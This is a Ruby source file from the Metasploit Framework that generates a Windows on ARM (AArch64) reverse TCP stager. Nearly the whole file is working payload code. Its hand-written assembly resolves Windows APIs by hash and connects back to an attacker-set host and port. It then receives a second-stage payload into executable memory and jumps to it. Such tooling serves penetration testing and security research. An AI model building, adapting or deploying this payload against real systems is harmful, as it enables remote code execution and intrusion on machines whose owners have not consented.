# -*- coding: binary -*-

module Msf
  # Windows AArch64 reverse_tcp stager payload generation.
  #
  # Empirically validated on Windows on ARM (build 10.0.26200). Uses
  # kernel32!FlushInstructionCache for portable icache maintenance -
  # user-space dc cvau / ic ivau trap as STATUS_ILLEGAL_INSTRUCTION on
  # WoA SoCs that leave SCTLR_EL1.UCI clear.
  #
  # Naming uses ReverseTcp_Aarch64 to match lib/msf_autoload.rb inflection
  # for reverse_tcp_aarch64.rb (same pattern as ReverseTcp_x64).
  module Payload::Windows::ReverseTcp_Aarch64 # rubocop:disable Naming/ClassAndModuleCamelCase
    include Msf::Payload::Windows
    include Msf::Payload::Windows::Aarch64
    include Msf::Payload::Windows::Exitfunk_Aarch64

    def generate(_opts = {})
      conf = {
        port: datastore['LPORT'],
        host: datastore['LHOST'],
        exitfunk: datastore['EXITFUNC']
      }
      generate_reverse_tcp(conf)
    end

    #
    # Generate and compile the AArch64 reverse_tcp stager.
    #
    # @option opts [Integer] :port The port to connect to
    # @option opts [String] :host The IPv4 address to connect to
    # @option opts [String] :exitfunk The exit method (process, thread, none, seh)
    # @return [String] raw shellcode bytes
    #
    def generate_reverse_tcp(opts = {})
      lhost = opts[:host]
      unless Rex::Socket.is_ipv4?(lhost)
        raise ArgumentError, 'LHOST must be in IPv4 format.'
      end

      ip_bytes = Rex::Socket.addr_aton(lhost)
      port_imm = [opts[:port].to_i].pack('n').unpack1('v')
      ip_lo_imm = ip_bytes[0, 2].unpack1('v')
      ip_hi_imm = ip_bytes[2, 2].unpack1('v')

      asm = build_stager_asm(
        port_imm: port_imm,
        ip_lo_imm: ip_lo_imm,
        ip_hi_imm: ip_hi_imm,
        exitfunk: opts[:exitfunk]
      )
      compile_aarch64(asm)
    end

    #
    # Msf::Payload::Windows#handle_intermediate_stage already sends the
    # 4-byte little-endian length prefix when RequiresMidstager is false.
    #

    protected

    def build_stager_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exitfunk:)
      # Slot table (x29 + offset):
      #   0x00 kernel32_base  0x08 &find_function  0x10 VirtualAlloc
      #   0x18 LoadLibraryA   0x20 recv            0x28 WSAStartup
      #   0x30 WSASocketA     0x38 WSAConnect      0x48 FlushInstructionCache
      #   0x50 sockaddr_in    0x70 WSADATA
      asm = <<~ASM
        main:
          sub     sp, sp, #0x300
          mov     x29, sp
          add     x19, x29, #0x50
          add     x21, x29, #0x70
      ASM
      asm += asm_block_api_aarch64
      asm += <<~ASM
        resolve_symbols_kernel32:
          str     x3, [x29, #0x00]
          movz    w0, #0x4e8e
          movk    w0, #0xec0e, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x18]
          movz    w0, #0xca54
          movk    w0, #0x91af, lsl #16
          ldr     x3, [x29, #0x00]
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x10]
          movz    w0, #0x0980
          movk    w0, #0x5312, lsl #16
          ldr     x3, [x29, #0x00]
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x48]
        load_ws2_32:
          movz    x0, #0x7357
          movk    x0, #0x5f32, lsl #16
          movk    x0, #0x3233, lsl #32
          movk    x0, #0x642e, lsl #48
          movz    w1, #0x6c6c
          sub     sp, sp, #16
          str     x0, [sp]
          str     w1, [sp, #8]
          mov     x0, sp
          ldr     x9, [x29, #0x18]
          blr     x9
          add     sp, sp, #16
          mov     x3, x0
        resolve_ws2_32:
          movz    w0, #0xedcb
          movk    w0, #0x3bfc, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x28]
          movz    w0, #0x09d9
          movk    w0, #0xadf5, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x30]
          movz    w0, #0xba0c
          movk    w0, #0xb32d, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x38]
          movz    w0, #0x19b6
          movk    w0, #0xe718, lsl #16
          ldr     x9, [x29, #0x08]
          blr     x9
          str     x0, [x29, #0x20]
        call_WSAStartup:
          movz    w0, #0x0202
          mov     x1, x21
          ldr     x9, [x29, #0x28]
          blr     x9
        call_WSASocket:
          mov     w0, #2
          mov     w1, #1
          mov     w2, #6
          mov     x3, xzr
          mov     w4, wzr
          mov     w5, wzr
          ldr     x9, [x29, #0x30]
          blr     x9
          mov     x22, x0
        fill_sockaddr_fast:
          movz    x0, #0x0002
          movk    x0, ##{format('0x%04x', port_imm)}, lsl #16
          movk    x0, ##{format('0x%04x', ip_lo_imm)}, lsl #32
          movk    x0, ##{format('0x%04x', ip_hi_imm)}, lsl #48
          stp     x0, xzr, [x19]
        call_WSAConnect:
          mov     x0, x22
          mov     x1, x19
          mov     w2, #16
          mov     x3, xzr
          mov     x4, xzr
          mov     x5, xzr
          mov     x6, xzr
          ldr     x9, [x29, #0x38]
          blr     x9
        recv_stage_length:
          mov     x0, x22
          mov     x1, x19
          mov     w2, #4
          mov     w3, wzr
          ldr     x9, [x29, #0x20]
          blr     x9
          cmp     w0, #4
          b.ne    exitfunk_prep
          ldr     w24, [x19]
        call_VirtualAlloc:
          mov     x0, xzr
          mov     x1, x24
          movz    w2, #0x3000
          movz    w3, #0x0040
          ldr     x9, [x29, #0x10]
          blr     x9
          cbz     x0, exitfunk_prep
          mov     x23, x0
        recv_stage_loop_init:
          mov     x25, x23
          mov     x26, x24
        recv_stage_loop:
          mov     x0, x22
          mov     x1, x25
          mov     x2, x26
          mov     w3, wzr
          ldr     x9, [x29, #0x20]
          blr     x9
          cmp     w0, #0
          b.le    exitfunk_prep
          add     x25, x25, x0, sxtw
          sub     x26, x26, x0, sxtw
          cbnz    x26, recv_stage_loop
        icache_flush:
          movn    x0, #0
          mov     x1, x23
          mov     x2, x24
          ldr     x9, [x29, #0x48]
          blr     x9
        jump_to_stage:
          mov     x0, x22
          br      x23
        exitfunk_prep:
          b       exitfunk
      ASM
      asm + asm_exitfunk_aarch64(exitfunk: exitfunk)
    end
  end
end
